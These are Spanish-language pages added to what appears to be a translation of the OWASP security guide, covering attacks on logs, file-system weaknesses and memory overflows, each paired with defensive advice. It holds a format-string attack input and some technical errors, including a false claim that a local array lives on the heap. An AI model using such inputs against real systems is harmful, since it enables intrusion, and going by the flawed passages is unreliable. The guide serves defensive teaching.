@@ -5890,207 +5890,2959 @@ no solo permite ver la información que fue leída, pero también por quien y cuand
 
 ****************************************************************************************************
 213
+• La estructura de los logs de información y también donde y de que manera (agregar,
+reemplazar) se escribió la información. Esto puede ser utilizado si la información fue
+sobrescrita o si el programa se encuentra escribiendo.
+• Modificación de las características de información, incluyendo permisos de control de
+acceso o etiquetas, ubicación en la base de datos o archivos de sistema, o dueño de la
+información. Los administradores pueden detectar si su configuración fue modificada.
+• Funciones administrativas y cambios de configuración independientemente de la
+superposición (actividades de manejo de cuenta, visualización de información de
+usuario, habilitación o deshabilitación de logueo, etc).
+• Información de depuración de errores miscelánea que puede ser activada o
+desactivada.
+• Todos los intentos de autorización (incluyendo la hora) tal como éxito/falla, recurso o
+función que esta siendo actualizada, y el usuario requiriendo la autorización. Con
+estos logs podemos detectar intentos de adivinación de contraseñas. Este tipo de logs
+pueden ser alimentados a un sistema de Detección de Intrusos que detectara
+anormalidades.
+• Eliminación de cualquier tipo de información (objeto). A veces se requiere que las
+aplicaciones posean cierto tipo de versionado en que el proceso de eliminación pueda
+ser cancelado.
+• Comunicaciones de red (asociación, conexión, aceptación, etc). Con esta información
+un sistema de Detección de Intrusos puede detectar escaneos de puertos y ataques de
+fuerza bruta.
+• Todos los eventos de autenticación (inicio de sesión, cierre de sesión, intento de
+acceso fallido, etc.) que permitan detectar ataques de fuerza bruta y también ataques
+por adivinación.
+Ruido
+
+ El invocar intencionalmente errores de seguridad para llenar un log de errores con
+entradas (ruidos) que ocultan evidencia incriminadota de un ataque exitoso. Cuando un
+administrador o una aplicación de análisis de logs revisan los logs, hay una alta probabilidad de 
 ****************************************************************************************************
 214
+que resuman el volumen de entradas al log como un intento de negación de servicio más que
+identificar “la aguja en el pajar”.
+Como protegerse
+
+Esto es difícil ya que las aplicaciones ofrecen una ruta sin impedimentos a funciones capaces
+de generar eventos de log. Si usted puede implementar un dispositivo inteligente o componente
+de aplicación que pueda rechazar un atacante luego de repetidos intentos, entonces resultaría de
+utilidad. Si esto fallara, una herramienta de auditoria para leer logs de errores que pueda reducir
+la mayor parte del ruido, basado en la repetición de eventos o que se originan de la misma fuente.
+También es útil si el visualizador de logs pudiera desplegar los eventos ordenados por nivel de
+severidad, en lugar de solamente el horario en el que ocurrió.
+Encubrimiento de pistas
+El premio mayor en ataques contra el mecanismo de log iría al contrincante que pudiera
+eliminar o manipular entradas de los a un nivel granular, “como si el evento nunca hubiera
+sucedido!”. La intrusión y la implementaron de rootkits permite a un atacante utilizar
+herramientas especializadas que pueden asistir o automatizar la manipulación de archivos
+conocidos de log. En muchos casos, los archivos de log pueden ser manipulados por usuarios con
+privilegios root / administrador, o a través de aplicaciones autorizadas a manipular logs. Como
+regla general los mecanismos de logue debería apuntar a prevenir la manipulación en un nivel
+granular ya que un atacante podría esconder sus rastros por un periodo de tiempo considerable
+sin ser detectado. Pregunta simple, si usted se encontrara comprometido por un atacante, seria la
+intrusión mas obvia si los archivos de log fueran anormalmente grandes o pequeños, o si se
+parecieran a los archivos de log de todos los días?
+Como Protegerse
+Asigne a los archivos de log la mayor protección de seguridad, proveyendo aseguramiento
+que usted siempre tendrá un grabador de “caja negra” efectivo si las cosas salen mal. Esto
+incluye:
+ Las aplicaciones no deberían correr con privilegios de Administrador o root. Esta es la
+principal causa para la manipulación exitosa de archivos de log ya que los usuarios privilegiados 
 ****************************************************************************************************
 215
+por lo general tienen acceso ilimitado a los archivos de sistema. Asuma el peor escenario y
+suponga que su aplicación sea atacada. Habría otras capas de seguridad para prevenir que los
+privilegios de usuario de la aplicación manipulen el archivo de log para cubrir las pistas?
+ Asegurándose que lo privilegios de acceso que protegen los archivos sea restrictivos,
+reduciendo la mayoría de operaciones contra el archivo de log que busquen alterar o leer.
+ Asegurándose que sean asignados nombres de objetos no obvios a los archivos de log y
+que sean almacenados en una ubicación segura en el archivo de sistema.
+ Escribiendo archivos de log utilizando técnicas publica o formalmente inspeccionadas en
+un intento de reducir el riesgo asociado con ingeniería reversa o manipulación del archivo de log.
+ Uso de tecnología hash para crear huellas digitales. La idea seria que si un atacante llega
+a manipular el archivo de log, entonces la huella digital no coincidirá y se generara una alerta.
+ Uso de tecnología IDS basada en Host, donde los patrones de comportamiento puedan ser
+“escritos en piedra”.
+Los intentos por parte de los atacantes para modificar el archivo de log a través de medios
+diferentes de los aprobados normalmente debería generar una excepción y la intrusión podría ser
+detectada y bloqueada. Este simple control de seguridad puede proteger contra intentos de
+modificación por parte del administrador.
+Falsas alarmas
+Tomando en cuenta el clásico film del año 1966 “Como robar un millón”; o similarmente la
+fabula de Esopo; “El lobo, la nana y el niño”; esté alerta a repetidas falsas alarmas ya que estas
+pueden representar las acciones de un atacante tratando de engañar al administrador de seguridad
+al hacerle pensar que la tecnología esta funcionando mal y no es confiable hasta que el problema
+sea solucionado.
+Como protegerse
+Simplemente esté alerta a este tipo de ataques, tome cada violación de seguridad seriamente,
+siempre llegue al fondo del asunto en lo que se refiere a log de errores, en lugar de ignorarlos al
+menos que se encuentre totalmente seguro que se trata de un problema técnico.
+Negación de servicio
+Enviando repetidos pedidos a una aplicación que genera entradas en el log, y multiplicando
+esto diez mil veces, usted obtendrá un archivo de log enorme y seguramente un dolor de cabeza
 ****************************************************************************************************
 216
+para el administrador de la aplicación. Cuando los logs son configurados para guardar una
+cantidad fija de información, una vez que estos están llenos, los mismos no guardaran mas
+información y el atacante habrá logrado generar una negación de servicio en dicho mecanismo.
+Peor aun, si no existe un tamaño máximo de archivo de log, un atacante tiene la posibilidad
+de llenar la partición del disco y potencialmente negar el servicio de todo el sistema. Esto sin
+embargo se esta convirtiendo en algo mas raro debido a los tamaños de los discos rígidos hoy en
+día.
+Como protegerse
+La principal defensa contra este tipo de ataque es incrementar el tamaño del archivo de log a
+un valor que difícilmente sea alcanzado, colocar el archivo de log en una partición separada al
+sistema operativo u otras aplicaciones criticas y mejor aun, intente implementar un mecanismo
+de monitoreo de sistemas que pueda tener un criterio con respecto al tamaño del archivo de log
+y/o actividad, como así también enviar una alerta cuando un ataque de este tipo es llevado a
+cabo.
+Destrucción
+Siguiendo el mismo escenario que la Negación de Servicio, si el archivo de log es
+configurado para sobrescribir las entradas antiguas cuando llega a su límite de tamaño, el
+atacante tiene el potencial de realizar sus malintencionadas acciones y luego generar un script de
+generación de logs para intentar sobrescribir las entradas de log incriminatorias, y
+consecuentemente destruyéndolas.
+Si todo lo demás falla, entonces un atacante puede simplemente elegir cubrir sus pasos
+eliminando todas las entradas de log, asumiendo que posee los privilegios para realizar tal
+acción. Este ataque probablemente involucre una llamada al programa manejador de archivos de
+log y enviar un comando para limpiar el log, o tal vez sea mas fácil aun eliminar el objeto que
+recibe las entradas de log (en la mayoría de los casos, este objeto es bloqueado por la aplicación).
+Este tipo de ataque hace que una intrusión sea obvia asumiendo que los archivos de log son
+regularmente monitoreados, y tiene la tendencia de causar pánico entre administradores y
+gerentes de sistemas debido a que deja pocos elementos en los cuales basar una investigación.
+Como protegerse 
 ****************************************************************************************************
 217
+Siguiendo la mayoría de las técnicas descriptas anteriormente le proveerán una buena
+protección contra este ataque. Tenga en cuenta dos cosas:
+Los usuarios administrativos del sistema deberían estar bien entrenados en manejo y revisión
+de archivos de log. La limpieza ‘Ad-Hoc’ de archivos de log nunca es recomendada y al menos
+un archivo siempre debería ser revisado. Muchas veces ocurre que los archivos de log son
+eliminados, tal vez para resolver un problema técnico, sin darse cuenta que se esta eliminando el
+historial de eventos para una posible futura investigación.
+Un log de seguridad sin contenido no necesariamente significa que debe llamar al equipo
+forense. En algunos casos, el log de seguridad se encuentra deshabilitado por defecto y usted
+debe habilitarlo. También asegúrese que los logs guardan la cantidad necesaria de detalles y
+establezca una base común de errores para medir lo que es considerada una actividad ‘normal’.
+Registros de auditoria
+Los registros de auditoria se encuentran legalmente protegidos en muchos países, y deberían
+ser guardados en lugares con alta integridad para prevenir modificaciones y eliminaciones
+casuales o motivadas.
+Como determinar si uno es vulnerable
+• Transitan los logs en texto claro entre el host de log y el destino?
+• Tienen los logs un mecanismo de prevención de modificación HMAC o similar para
+prevenir cambios desde el momento en que la actividad es registrada hasta el
+momento en que es revisada?
+• Pueden ser fácilmente extraídos los logs relevantes de una manera legal para asistir en
+una investigación?
+Como protegerse
+• Solo audite eventos realmente importantes – usted tiene que mantener registros de
+auditoria por un largo tiempo, y por ejemplo los mensajes de debug o que contienen
+solo información de sistema son una perdida de recursos.
+• Centralice los logs cuando sea apropiado y asegúrese que los registros de auditoria
+más importantes no sean almacenados en sistemas vulnerables, particularmente
+servidores web.
+• Solo revise las copias de los logs, y no los logs originales. 
 ****************************************************************************************************
 218
+• Para sistemas altamente protegidos, utilice solo dispositivos de escritura única o
+similar para proveer repositorios confiables a largo término.
+• Para sistemas altamente protegidos, asegúrese que existe una confianza de punta a
+punta en los mecanismos de log. Logs que son de escritura universal, agentes de log
+sin credenciales (tales como SNMP, syslog, etc) son vulnerables legalmente a ser
+excluidos de una investigación.
+Lectura adicional
+• Oracle Auditing
+http://www.sans.org/atwork/description.php?cid=738
+• Sarbanes Oxley for IT security
+http://www.securityfocus.com/columnists/322 
 ****************************************************************************************************
 219
+Sistema de Ficheros
+Objetivo
+Asegurar que el acceso local al sistema de ficheros por algún sistema está protegido de
+creaciones, modificaciones o eliminaciones no autorizadas.
+Entornos afectados
+Todos.
+Temas de COBIT Relevantes
+DS11 – Administración de datos – Todas las revisiones han de ser revisadas.
+DS11.9 – Integridad del procesamiento de datos.
+DS11.20 – Continuidad de la integridad de los datos almacenados.
+Descripción
+El sistema de ficheros es un terreno fértil para atacantes y script kiddies. Los ataques pueden
+ser devastadores para un sitio medio, a menudo estos ataques son los más fáciles de realizar.
+Mejores Prácticas
+• Usar jaulas “chroot” en plataformas Unix.
+• Usar los mínimos permisos en el sistema de ficheros de todas las plataformas.
+• Considerar la utilización de sistemas de fichero de solo lectura (como CD-ROM o llaves
+USB bloqueadas) si fuera posible.
+Deformación
+La deformación es uno de los ataques más comunes contra los web sites. Un atacante usa una
+herramienta o técnica para subir un contenido hostil sobre los ficheros existentes o vía una
+configuración con fallos.
+Existen muchos repositorios de deformaciones en Internet, la gran mayoría de deformaciones
+ocurren por falta de parches en un servidor web vulnerable, pero los siguientes más comunes
+ocurren a causa de una vulnerabilidad en la aplicación web.
+Como identificar si es vulnerable
+
 ****************************************************************************************************
 220
+• ¿Está el sistema actualizado?
+• ¿Permiten los permisos del sistema de ficheros la escritura al usuario web en el contenido
+(incluidos los directorios)?
+• ¿La aplicación escribe los nombres de ficheros con los nombres facilitados por el
+usuario?
+• ¿La aplicación utilizada llamadas al sistema o ejecución de comandos (como exec() o
+xp_cmdshell() )?
+• ¿Puede alguna ejecución o llamada al sistema permitir la ejecución adicional de
+comandos no autorizados? Comprobar la sección de inyección en SO para mayor detalle.
+Como protegerse
+• Asegurar o recomendar que el sistema operativo y entorno de aplicaciones web se
+mantenga al día
+• Asegurar que ficheros y recursos son de solo lectura.
+• Asegurar que la aplicación no obtiene los nombres de fichero del usuario cuando los
+guarda o trabaja en ficheros locales
+• Asegurar que la aplicación comprueba correctamente la información enviada por el
+usuario para prevenir comandos que no deben ejecutarse.
+Navegación Transversal de Directorios
+Todas, excepto las aplicaciones web más sencillas, incluyen recursos locales, como
+imágenes, temas, otros scripts y así sucesivamente. Cada vez que un recurso o fichero es incluido
+por una aplicación, existe el riesgo de que un atacante pueda ser capaz de incluir un archivo
+remoto o recursos no autorizados.
+Como identificar si es vulnerable
+• Inspeccionar el código que abre ficheros, incluye, crea archivos, borra archivos y así
+sucesivamente
+• Determinar si contiene entrada de valores no comprobados.
+• Si es así, la aplicación es probable que este en situación de riesgo.
+Como protegerse 
 ****************************************************************************************************
 221
+
+• Preferiblemente trabajar sin utilizar datos introducidos por el usuario cuando se realizan
+llamadas de sistema
+• Utilizar los índices reales en lugar de porciones de nombres de archivo para el uso de
+plantillas o archivos de idioma (es decir, el valor 5 de la presentación = usuario de
+Checoslovaquia, en lugar de esperar que el usuario pueda introducir “Checoslovaquia”)
+• Asegurar que el usuario no puedo introducir partes de la ruta – mediante códigos de ruta.
+• Validar los datos introducidos por el usuario aceptando solo los conocidos como buenos,
+no eliminando los datos incorrectos.
+• Usar jaulas “chroot”, y utilizar políticas de acceso para restringir de donde se pueden
+obtener los ficheros o almacenarlos
+Permisos Inseguros
+Muchos desarrolladores toman atajos para conseguir que sus aplicaciones funcionen, y a
+menudo muchos administradores de sistemas no comprenden plenamente los riesgos de un
+sistema de ficheros con ACLS permisivas.
+Como identificar si es vulnerable
+• ¿Pueden otros usuarios locales leer, modificar o borrar ficheros usados por la aplicación
+web?
+Si es así, es muy probable que la aplicación sea vulnerable local y remotamente.
+Como protegerse
+• Utilice los permisos más restrictivos posibles cuando desarrolle y despliegue una
+aplicación web.
+• Muchas aplicaciones web se pueden desplegar en modo de solo lectura, como un CDROM
+
+• Considere la posibilidad de utilizar cárceles chroot y políticas de acceso de código para
+restringir y controlar la localización y tipo de operaciones de fichero incluso si el sistema
+está mal configurado. 
 ****************************************************************************************************
 222
+
+• Eliminar todas las ACLs de Windows de tipo “Todos: Control total”, todos los modos
+777 (directorios escribibles para todo el mundo) o el modo 666 (ficheros escribibles para
+todo el mundo) en sistemas Unix.
+• Considerar seriamente la eliminación de “Guest”, “everyone” y los permisos de lectura
+para todo el mundo siempre que sea posible.
+Indexación Insegura
+Una herramienta muy popular es el Desktop de Google, y Spotlight en Macintosh. Estas
+herramientas permiten a los usuarios encontrar cualquier cosa sencillamente en los discos duros.
+La misma tecnología permite a intrusos determinar remotamente que es lo que se está ocultando
+de la aplicación.
+Como identificar si es vulnerable
+• Use Google y una gama de otros motores de búsqueda para encontrar algo en el sitio
+web, como etiquetas meta o ficheros ocultos.
+• Si encuentra un fichero, su aplicación está en riesgo.
+Como protegerse
+• Utilizar el archivo robots.txt – esto impide que la mayoría de los motores de búsqueda,
+busque más allá de lo que se ha especificado en el archivo.
+• Controlar las actividades de cualquier motor de búsqueda que se ejecute en la web, como
+el motor de búsqueda de IIS, Sharepoint, aparato de Google y otros.
+• Si no se requiere el uso de indexación de la web, desactivar cualquier funcionalidad de
+búsqueda que este activa.
+Ficheros no Mapeados
+Los frameworks de la aplicación web interpretarán a los usuarios solo sus propios ficheros,
+renderizando otros contenidos como HTML o texto plano. Esto puede revelar secretos y
+configuraciones que un atacante podría utilizar para obtener un ataque con éxito.
+Como identificar si es vulnerable 
+
 ****************************************************************************************************
 223
+
+Subir un fichero que normalmente no es visible, como un fichero de configuración como el
+config.xml o similar, y solicítelo con el navegador. Si el contenido del fichero es renderizado o
+expuesto, entonces la aplicación esta en riesgo.
+Como protegerse
+• Elimine o mueva todos los ficheros que no pertenezcan al raíz de la web.
+• Renombre los ficheros incluidos a extensiones normales (como foo.inc -> foo.jsp o
+foo.aspx)
+• Mapear todos los ficheros que se necesitan, como los .xml o los .cfg a un gestor de
+errores o renderizado que no muestre el contenido del fichero. Esto ha de ser hecho en la
+configuración del framework de la aplicación web o en la configuración del servidor web.
+Ficheros Temporales
+Las aplicaciones ocasionalmente necesitan escribir los resultados o informes en disco. Si los
+ficheros temporales son expuestos a usuarios no autorizados pueden ofrecer información privada
+y confidencial, o permitir a un atacante ser un usuario autorizado dependiendo del nivel de la
+vulnerabilidad.
+Como identificar si es vulnerable
+Determinar si la aplicación usa ficheros temporales. Si los utiliza, comprobar lo siguiente:
+• ¿Se guardan los ficheros en la raíz del sitio web? ¿Si es así, estos pueden ser obtenidos
+utilizando un navegador? Si lo permite, ¿se pueden obtener sin estar autenticado?
+• ¿Están expuestos ficheros antiguos? ¿Existe un recolector de basura u otro mecanismo
+regulador para eliminar archivos antiguos?
+• ¿La obtención de ficheros expone cómo funciona la aplicación, o expone datos privados?
+El nivel de la vulnerabilidad está definido por la clasificación de activos asignados a los
+datos.
+Como protegerse
+El uso de archivos temporales no siempre es importante protegerlo contra accesos no
+autorizados. Para los riesgos altos y medios, particularmente si los ficheros exponen 
+
 ****************************************************************************************************
 224
+
+funcionamiento interno de la aplicación o datos privados del usuario, los siguientes controles se
+han de considerar:
+• Las retinas de los archives temporales pueden ser escritas nuevamente para generar el
+contenido dinámicamente sin tener que almacenarlo en disco.
+• Asegurar que todos los recursos no son obtenibles por usuarios no autorizados, y que los
+usuarios autorizados solo pueden obtener sus propios ficheros.
+• Usar un “recolector de basura” para eliminar ficheros viejos, ya sea al final de una sesión
+o con un tiempo de expiración, como por ejemplo 20 minutos.
+• Si está desplegado bajo un sistema operativo Unix, usar jaulas chroot para aislar la
+aplicación del sistema operativo primario. En Windows, use el soporte de las ACL para
+prevenir que los usuarios de IIS obtengan o reescriban los ficheros directamente.
+• Mover los ficheros fuera del raíz de la web para prevenir ataques de solo navegación.
+• Usar nombres al azar de ficheros para dificultar la posibilidad de obtener ficheros en base
+a un ataque de fuerza bruta.
+Ficheros Antiguos No Referenciados
+Es común que administradores y desarrolladores utilicen editores y otras herramientas que
+generan archivos temporales antiguos. Si la extensión del fichero o los permisos de acceso
+cambian, un atacante podría leer el código o la configuración.
+Como identificar si es vulnerable
+Buscar en el sistema de ficheros:
+• Ficheros temporales (como core, ~foo, blah.tmp, y otros) creados por editores y
+programas al generar errores.
+• Archivos llamados “backup” “antiguo” “Copia de …”
+• Ficheros con extensiones adicionales como foo.php.old
+• Directorios temporales con resultados intermedios o plantillas cacheadas.
+Como protegerse
+• Usar controles de código fuente para prevenir la necesidad de mantener copias antiguas
+de los ficheros. 
+
 ****************************************************************************************************
 225
+• Periódicamente asegurar que todos los ficheros en la raíz de la web son necesarios.
+• Asegurar que los archives temporales de la aplicación no son accesibles desde el raíz de
+la web.
+Inyección de Segundo Orden
+Si la aplicación web crea ficheros que son utilizados por otros procesos, generalmente
+procesamientos por lotes o programados, el segundo proceso puede ser vulnerable a un ataque.
+Es raro que la aplicación asegure que la información del proceso en segundo plano valide la
+información antes de procesarla.
+Como identificar si es vulnerable
+• ¿La aplicación utiliza procesos en segundo plano / procesos por lotes / programados, para
+trabajar con datos suministrador por el usuario?
+• ¿El programa valida los datos antes de operar con ellos?
+• ¿Esta aplicación se comunica con otros procesos de negocio o transacciones aprobadas?
+Como protegerse
+• Asegurar que todas las aplicaciones de segundo plano comprueban los datos enviados por
+el usuario antes de trabajar con ellos.
+• Ejecutar las aplicaciones con el mínimo privilegio posible - en particular, los
+procesamientos por lotes que no requieren privilegios de escritura en ningún fichero de
+los front-end, en la red o similar.
+• Utilizar el lenguaje incorporado o características del sistema operativo para reducir los
+recursos y las características que la aplicación puede utilizar. Por ejemplo, lote programas
+raramente o nunca necesitan acceso a la red.
+• Considerar el uso de un detector de intrusos de host (HIDS) o sistemas antivirus para
+detectar creación de ficheros no autorizados.
+Lectura adicional
+• Klein, A., Insecure Indexing
+http://www.webappsec.org/projects/articles/022805-clean.html
 ****************************************************************************************************
 226
+• MySQL world readable log files
+http://www.securityfocus.com/advisories/3803
+• Oracle 8i and 9i Servlet allows remote file viewing
+http://online.securityfocus.com/advisories/3964 
 ****************************************************************************************************
 227
+
+Desbordamientos de memoria
+Objetivo
+Garantizar que:
+• Las aplicaciones no se expongan a componentes defectuosos
+• Las aplicaciones creen tengan el mas adecuado manejo de memoria como sea posible
+• Alentar el uso de lenguajes y marcos de trabajo que sean relativamente inmunes a
+desbordamientos de memoria
+Plataformas afectadas
+Casi todas las plataformas, con las siguientes notables excepciones:
+J2EE siempre y cuando no sean invocadas las llamadas a sistema
+.NET mientras no se utilice código inseguro o previamente no gestionado (como por ejemplo
+el uso de P/Invoke o COM Interop)
+PHP de igual forma mientras no se utilicen programas externos o extensiones PHP escritas en
+C o C++.
+Temas relevantes de COBIT
+DS11.9 – Integridad en el procesamiento de datos
+Descripción
+Los atacantes se valen de los desbordamientos de memoria para corromper la pila de
+ejecución de una aplicación web. Por medio del envió de información cuidadosamente elaborada
+a una aplicación web, un atacante puede utilizar valerse de esta para ejecutar código de manera
+arbitraria y tomar el control del equipo. Los atacantes han logrado identificar desbordamientos de
+memoria en una asombrosa gama de productos y componentes.
+Las fallas de desbordamiento de memoria pueden estar presentes en ambos lugares: la
+aplicación web o los productos del servidor de aplicaciones que hospedan aspectos dinámicos o
+estáticos del sitio. Este tipo de ataque encontrado ampliamente en los productos utilizados por
+los servidores puede llegar a ser ampliamente difundido para su conocimiento y significar un
+riesgo relevante para los usuarios de estos productos. Cuando las aplicaciones web utilizan
+librerías adicionales, por ejemplo para generar imágenes, por si mismas están abriendo ataques
+
 ****************************************************************************************************
 228
+potenciales de desbordamiento de memoria. La documentación escrita acerca de los ataques de
+desbordamiento de memoria en contra de ciertos productos esta ampliamente disponible.
+Los desbordamientos de memoria también se encuentran en el código de las aplicaciones
+hechas a la medida e incluso puede ser más probable que existan debido a la falta de control por
+las que pasan estas. Este tipo de ataques en contra de aplicaciones web hechas a la medida puede
+llegar algunas veces a resultados interesantes. En algunas ocasiones hemos descubierto que
+enviando datos de entrada de gran tamaño es posible causar que la aplicación web o la base de
+datos detrás de ésta tengan un mal funcionamiento. Es posible lograr un ataque de negación de
+servicio en contra del sitio web, dependiendo de la severidad y de la debilidad presentada. Se
+presenta el caso en que entradas de información demasiado grandes provocan un error que
+muestra un mensaje que proporciona demasiado detalle, lo cual puede llevar a lograr un ataque
+exitoso en el sistema.
+Desbordamientos de pila
+El desbordamiento de pila es la mejor definición y la manera más común de desbordamientos
+de pila. Los fundamentos de este concepto son simples:
+• Existen dos localidades de memoria la primera, llamada memoria fuente, contiene
+entradas de datos arbitrarias de ataque y, la memoria de destino que es demasiado
+pequeña para contener datos de ataque. Es necesario que la segunda localidad de
+memoria se encuentre en una pila y algo cerca de la función que regresa la dirección en la
+pila.
+• Un código defectuoso no valida que la primer memoria sea demasiado grande para la
+segunda memoria. Copia los datos hostiles en la segunda memoria, borrándola y la
+función en la pila regresa la dirección de memoria.
+• Cuando la función retorna, el procesador desenvuelve la pila y extrae la dirección de la
+pila. La dirección de retorno, esta ahora contaminada y apunta al código de ataque.
+• El ataque se ejecuta en lugar de devolver a la aplicación la llamada previa.
+Como determinar si es vulnerable
+Si su programa:
+• Es escrito o depende de un programa escrito en un lenguaje propenso a ataques de
+desbordamiento de memoria Y 
+
 ****************************************************************************************************
 229
+
+• Toma datos de entrada de usuario Y
+• No ‘desinfecta’ estos datos Y
+• Utiliza variables ubicadas en pila sin ningún control de monitoreo de desbordamiento.
+Si cuenta con las características anteriores es probable que la aplicación sea vulnerable a este
+ataque.
+Como protegerse
+• Despliegue su aplicación en sistemas capaces de evitar la ejecución de pilas
+(procesadores AMD e Intel x86-64 con sistemas operativos a 64 bits) XP SP2 (a 32 y 64
+bits), Windows 2003 con SP1 (a 32 y 64 bits), Linux posterior a 2.6.8 en procesadores
+AMD y x86-64 a 32 y 63 bits, OpenBSD (en Intel, AMD, Sparc, Alpha y PowerPC),
+Solaris 2.6 y posterior con la propiedad de kernel noexec_user_stack habilitada.
+• Utilice lenguajes de programación diferentes a C o C++
+• Valide los datos de entrada del usuario para prevenir campos demasiado largos y revise
+los valores para asegurar de que se encuentran dentro de una especificación (por ejemplo
+A-Z, a-z, 0-9, etc.)
+• Si confía plenamente en su sistema operativo y en aplicaciones escritas en C o C++,
+asegúrese de que utilicen el principio de privilegios mínimos, utilice compiladores que lo
+puedan proteger contra desbordamientos de montículo y de pila y mantenga el sistema
+actualizado con los parches correspondientes.
+Desbordamiento de montículo
+Los desbordamientos de montículo son problemáticos y no son necesariamente protegidos
+por las capacidades de configuración del procesador para no ejecutar pilas. Un montículo es un
+área de memoria destinada al por la aplicación en tiempo de ejecución para almacenar las
+variables declaradas.
+function foo(char *bar) {
+char thingy[128];
+…
+} 
+
 ****************************************************************************************************
 230
+
+bar es pasado por medio de la pila, y thingy es ubicado en la memoria montículo. Las
+posibilidades de desbordamiento son exactamente las miasmas que en los desbordamientos de
+pila.
+Como determinar si es vulnerable
+Si su programa:
+• Esta escrito o depende de otro programa escrito en un lenguaje que sufre de
+desbordamientos de montículo Y
+• Toma datos de entrada del usuario Y
+• No desinfecta estos datos de entrada Y
+• Utiliza variables ubicadas en pila sin ningún control de monitoreo de desbordamiento
+Si cuenta con las características anteriores es probable que la aplicación sea vulnerable a este
+ataque.
+Como protegerse
+• Utilice otros lenguajes de programación que no sean C o C++
+• Valide los datos de entrada del usuario para prevenir campos demasiado largos y revise
+los valores para asegurar de que se encuentran dentro de una especificación (por ejemplo
+A-Z, a-z, 0-9, etc.)
+• Si confía plenamente en su sistema operativo y en aplicaciones escritas en C o C++,
+asegúrese de que utilicen el principio de privilegios mínimos, utilice compiladores que lo
+puedan proteger contra desbordamientos de montículo y de pila y mantenga el sistema
+actualizado con los parches correspondientes.
+Formato de cadena
+Los desbordamientos de memoria por formato de cadena son causados cuando un usuario
+ingresa una entrada similar a:
+%08x.%08x.%08x.%08x.%08x\n
+Esta cadena de ataque imprimirá los primeros cinco caracteres de entrada en la pila de
+memoria. El formato de cadenas con desbordamientos de memoria altamente especializados y
+pueden ser utilizados para realizar todos los mismos tipos de ataques, incluyendo compromiso
+remoto completo. 
+
 ****************************************************************************************************
 231
+
+Como determinar si es vulnerable
+Si su programa:
+• Esta escrito o depende de otro programa escrito en un lenguaje que sufre de
+desbordamientos de memoria Y
+• Toma datos de entrada del usuario Y
+• No desinfecta estos datos de entrada Y
+• Utiliza las funciones printf(), snprintf y/o similares o utiliza servicios de sistema que las
+utilicen, como “syslog”.
+Si cuenta con las características anteriores es probable que la aplicación sea vulnerable a este
+ataque.
+Como protegerse
+• Utilice otros lenguajes de programación que no sean C o C++
+• Evite el uso de las funciones similares a printf() ya que esta permite al usuario modificar
+el formato de salida.
+• Valide los datos de entrada del usuario para prevenir campos demasiado largos y revise
+los valores para asegurar de que se encuentran dentro de una especificación (por ejemplo
+A-Z, a-z, 0-9, etc.)
+• Si confía plenamente en su sistema operativo y en aplicaciones escritas en C o C++,
+asegúrese de que utilicen el principio de privilegios mínimos, instale la aplicación en
+sistemas que no hagan una ejecución de pilas de memoria y mantenga el sistema
+actualizado con los parches correspondientes.
+Desbordamiento Unicode
+Los ataques Unicode son un poco más difíciles de llevar a cabo que uno de desbordamiento
+de memoria típico como lo demuestra el documento de Anley en 2002, pero es un error asumir
+que usando Unicode usted este protegido contra los desbordamientos de memoria. Entre los
+ejemplos de desbordamiento Unicode se incluye el Código Rojo, que fue un devastador troyano.
+Como determinar si es vulnerable
+Si el programa
 ****************************************************************************************************
 232
+• Es escrito o depende de un programa escrito en un lenguaje propenso a ataques de
+desbordamiento de memoria Y
+• Toma datos Unicode como entrada de usuario Y
+• No ‘desinfecta’ estos datos Y
+• Utiliza montículos o pilas de memoria sin ningún control de monitoreo de
+desbordamiento.
+Si cuenta con las características anteriores es probable que la aplicación sea vulnerable a este
+ataque.
+Como protegerse
+• Manténgase al día con los reportes de errores encontrados en su web y el servidor de
+aplicaciones así como otros productos de su infraestructura de Internet. Aplique los
+últimos parches a estos productos.
+• Escanee periódicamente su sitio web con uno o mas de los comúnmente disponibles
+analizadores que busquen fallas de desbordamiento de memoria en los elementos de su
+servidor y aplicaciones hechas a la medida.
+• Revise su código en busca de fallas Unicode.
+En el caso de las aplicaciones hechas en casa, necesita revisar todo el código que acepte
+datos de entrada de fuentes desconfiables y asegúrese de que provean tamaños apropiados.
+Desbordamiento de enteros
+Cuando una aplicación toma dos numeros o un tamaño de palabra armado y lleva a cabo una
+operación con ellos, el resultado puede no corresponder con el mismo tamaño de palabra. Por
+ejemplo, si dos numeros de 8 bits, 192 y 208, son sumados y almacenados en otro byte de 8 bits,
+el resultado no cabra en un tipo de 8 bits:
+% 1100 0000
++ % 1101 0000
+= % 0001 1001 0000
+La primera mita de la palabra es desechada, el resto es un resultado no valido. Esto puede
+representar un problema en cualquier lenguaje. Por ejemplo, muchas conversiones 
 ****************************************************************************************************
 233
+hexadecimales traducirían “exitosamente” %M0 a 192. Otras áreas de interés incluyen índices de
+arreglos y operaciones matemáticas pequeñas implícitas.
+Como determinar si es vulnerable
+• Ponga atención en los enteros con signo, particularmente en los tipos byte y cortos.
+• ¿Tiene casos en los que los valores son usados como índices de arreglo después de haber
+llevado a cabo operaciones como + - * / o modulo?
+• ¿Se enfrenta el código con enteros negativos o índices nulos?
+Como protegerse
+• .NET: Utilice el EnteroSeguro de David LeBlanc <> clase de C++ o una construcción
+similar
+• Si su compilador lo soporta, cambie el valor predeterminado de los enteros para que no
+tengan signo a menos que les especifique explícitamente. Utilice enteros sin signo donde
+sea que se requieran.
+• Use verificaciones de rango si su lenguaje o marco de trabajo lo soporta
+• Sea cuidadoso al usar operaciones aritmeticas con valores pequeños, particularmente si
+exceden el limite inferior o inferior, otros errores pueden aparecer de la nada 
 ****************************************************************************************************
 234
+
+Lectura adicional (en inglés)
+• Team Teso, Exploiting Format String Vulnerabilities
+http://www.cs.ucsb.edu/~jzhou/security/formats-teso.html
+• Woo woo and Matt Conover, Preliminary Heap Overflow Tutorial
+http://www.w00w00.org/files/articles/heaptut.txt
+• Chris Anley, Creating Arbitrary Shellcode In Unicode Expanded Strings
+http://www.ngssoftware.com/papers/unicodebo.pdf
+• David Leblanc, Integer Handling with the C++ SafeInt Class
+http://msdn.microsoft.com/library/default.asp?url=/library/enus/dncode/html/secure01142004.asp
+
+• Aleph One, Smashing the Stack for fun and profit
+http://www.phrack.org/phrack/49/P49-14
+• Mark Donaldson, Inside the buffer Overflow Attack: Mechanism, method, & prevention
+http://rr.sans.org/code/inside_buffer.php
+• NX Bit, Wikipedia article
+http://en.wikipedia.org/wiki/NX_bit
+• Horizon, How to bypass Solaris no execute stack protection
+http://www.secinf.net/unix_security/How_to_bypass_Solaris_nonexecutable_stack_prote
+ction_.html
